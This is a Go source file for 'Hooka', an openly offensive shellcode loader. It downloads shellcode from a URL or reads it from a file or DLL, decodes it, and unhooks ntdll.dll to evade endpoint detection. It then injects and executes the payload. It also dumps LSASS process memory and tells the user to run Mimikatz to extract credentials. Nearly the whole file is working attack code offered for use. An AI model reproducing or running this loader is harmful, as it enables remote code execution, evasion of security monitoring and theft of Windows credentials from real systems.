package main

import (
  "os"
  "time"
  "flag"
  "strings"
  "encoding/hex"
  "encoding/base64"

  // Hooka
  "github.com/D3Ext/Hooka/core"

  // My own malware dev package
  l "github.com/D3Ext/maldev/logging"
)

func main() {
  var shellcode []byte
  var err error

  // Parse CLI flags and retrieve values
  sc_url, sc_file, dll_file, technique, hook_detect, _, unhook, base64_flag, hex_flag, test_flag, lsass := core.ParseFlags()

  l.PrintBanner("Hooka!")
  l.Println(" by D3Ext - v0.1")
  time.Sleep(100 * time.Millisecond)

  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (!hook_detect) && (!test_flag) { // Enter here if any main flag was especified
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Parameters missing: provide a shellcode to inject (--file/--url/--dll), detect hooked functions (--hooks) or test program capabilities (--test)\n")
    os.Exit(0)

  } else if (sc_url != "") && (sc_file != "") && (dll_file == "") { // Check if both --url and --file flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --url and --file at the same time!\n")

  } else if (sc_url != "") && (sc_file == "") && (dll_file != "") { // Check if both --url and --dll flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --url and --dll at the same time!\n")

  } else if (sc_url == "") && (sc_file != "") && (dll_file != "") { // Check if both --file and --dll flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --file and --dll at the same time!\n")

  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") {

    if (base64_flag) && (hex_flag) { // Check if both flags were passed
      l.Println()
      flag.PrintDefaults()
      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
      os.Exit(0)
    }

    if (unhook != 1) && (unhook != 2) && (unhook != 3) && (unhook != 0) {
      l.Println("\n[-] Unknown unhooking technique! Allowed values: 1, 2, 3\n")
      os.Exit(0)
    }

    time.Sleep(200 * time.Millisecond)
    l.Println("\n[+] Remote shellcode URL: " + sc_url)
    time.Sleep(300 * time.Millisecond)

    if (!base64_flag) && (!hex_flag) { // Check shellcode encoding flags
      l.Println("[+] No encoding was especified")
    } else if (base64_flag) && (!hex_flag) {
      l.Println("[+] Shellcode encoding: base64")
    } else if (!base64_flag) && (hex_flag) {
      l.Println("[+] Shellcode encoding: hex")
    }
    time.Sleep(300 * time.Millisecond)

    l.Println("[*] Retrieving shellcode from url...")
    shellcode, err = core.GetShellcodeFromUrl(sc_url)
    if err != nil { // Handle error
      l.Println("[-] An error has ocurred retrieving shellcode!")
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)

    if (base64_flag) && (!hex_flag) { // Decode shellcode if necessary
      l.Println("[*] Decoding shellcode...")
      shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }
      time.Sleep(300 * time.Millisecond)

    } else if (!base64_flag) && (hex_flag) {
      l.Println("[*] Decoding shellcode...")
      shellcode, err = hex.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }
      time.Sleep(300 * time.Millisecond)
    }

    // Unhook function(s)
    if (unhook == 1) {
      l.Println("[*] Unhooking functions via Classic technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
      if err != nil {
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    } else if (unhook == 2) {
      l.Println("[*] Unhooking functions via Full Dll technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.FullUnhook("ntdll.dll")
      if err != nil {
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    } else if (unhook == 3) {
      l.Println("[*] Unhooking functions via Perun's Fart technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.PerunsUnhook()
      if err != nil {
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    }

    if (technique != "") {
      l.Println("[*] Injecting shellcode using " + technique + " function")
    }

    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_file != "") && (sc_url == "") && (dll_file == "") {

    if (base64_flag) && (hex_flag) { // Check if both flags were passed
      l.Println()
      flag.PrintDefaults()
      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
      os.Exit(0)
    }

    _, err := os.Stat(sc_file) // Check if file exists
    if os.IsNotExist(err) {
      l.Println("\n[-] Especified file doesn't exist!\n")
      time.Sleep(100 * time.Millisecond)
      os.Exit(0)
    }

    time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
    l.Println("[+] Shellcode file: " + sc_file)
    time.Sleep(300 * time.Millisecond)
    l.Println("[*] Getting shellcode from file")
    time.Sleep(300 * time.Millisecond)

    shellcode, err = core.GetShellcodeFromFile(sc_file) // Read file and retrieve shellcode as bytes
    if err != nil { // Handle error
      l.Fatal(err)
    }

    if (!base64_flag) && (!hex_flag) { // Check shellcode encoding flags
      l.Println("[+] No encoding was especified")
      time.Sleep(300 * time.Millisecond)

    } else if (base64_flag) && (!hex_flag) {
      l.Println("[+] Shellcode encoding: base64")
      shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
      if err != nil {
        l.Fatal(err)
      }

      time.Sleep(300 * time.Millisecond)
      l.Println("[*] Decoding shellcode")
      time.Sleep(300 * time.Millisecond)

    } else if (!base64_flag) && (hex_flag) {
      l.Println("[+] Shellcode encoding: hex")
      shellcode, err = hex.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }

      time.Sleep(300 * time.Millisecond)
      l.Println("[*] Decoding shellcode")
      time.Sleep(300 * time.Millisecond)
    }

    // Unhook function(s)
    if (unhook == 1) {
      l.Println("[*] Unhooking functions via Classic technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.ClassicUnhook(technique, "C:\\Windows\\System32\\ntdll.dll")
      if err != nil { // Handle error
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    } else if (unhook == 2) {
      l.Println("[*] Unhooking functions via Full Dll technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.FullUnhook("ntdll.dll")
      if err != nil { // Handle error
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    } else if (unhook == 3) {
      l.Println("[*] Unhooking functions via Perun's Fart technique...")
      time.Sleep(200 * time.Millisecond)
      err := core.PerunsUnhook()
      if err != nil { // Handle error
        l.Println("[-] An error has ocurred while unhooking functions!")
        l.Fatal(err)
      }

    }

    if (technique != "") {
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") {

    dll_filename := strings.Split(dll_file, ",")[0] // Get DLL path
    dll_func := strings.Split(dll_file, ",")[1] // Get DLL function to execute

    _, err := os.Stat(dll_filename) // Check if especified dll exists
    if os.IsNotExist(err) {
      l.Println("\n[-] Especified DLL doesn't exists!\n")
      time.Sleep(100 * time.Millisecond)
      os.Exit(0)
    }

    time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
    l.Println("\n[+] DLL file: " + dll_filename)
    time.Sleep(300 * time.Millisecond)
    l.Println("[+] Function to execute: " + dll_func)
    time.Sleep(300 * time.Millisecond)

    l.Println("[*] Converting " + dll_filename + " to position independant shellcode")
    shellcode, err := core.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)
    l.Println("[+] Process finished successfully!")
    time.Sleep(100 * time.Millisecond)

    if (technique != "") { // Check if technique has value so it doesn't get printed twice
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    err = core.InjectWithTechnique(shellcode, technique) // Inject shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (hook_detect) { // Enter here if --hooks flag was especified

    l.Println("\n[*] Detecting hooked functions...")

    all_hooks, err := core.DetectHooks() // Get all hooked functions
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Process finished")

    if len(all_hooks) >= 1 { // Check if hooks array contains at least one function
      time.Sleep(200 * time.Millisecond)
      l.Println("[*] Hooked functions:\n")
      for _, h := range all_hooks {
        l.Println(h)
      }
      l.Println()
      time.Sleep(200 * time.Millisecond)

    } else {
      time.Sleep(200 * time.Millisecond)
      l.Println("[+] No function is hooked!\n")
      time.Sleep(100 * time.Millisecond)
    }

  } else if (sc_url == "") && (sc_file == "") && (!hook_detect) && (test_flag) {
    
    l.Println("\n[*] Testing shellcode injection with calc.exe shellcode")
    time.Sleep(200 * time.Millisecond)

    err := core.InjectWithTechnique(core.CalcShellcode(), technique) // Inject calc.exe shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Shellcode should have been executed!\n")

  } else if (lsass != "") { // Enter here if --lsass flag was especified
    l.Println("[*] Dumping lsass process to " + lsass)
    
    err := core.DumpLsass(lsass)
    if err != nil { // Handle error
      l.Println("[-] An error has ocurred, ensure to be running as admin:")
      l.Fatal(err)
    }

    l.Println("[+] Process finished! Now use Mimikatz in your machine to extract credentials\n")
    time.Sleep(100 * time.Millisecond)
  }
}

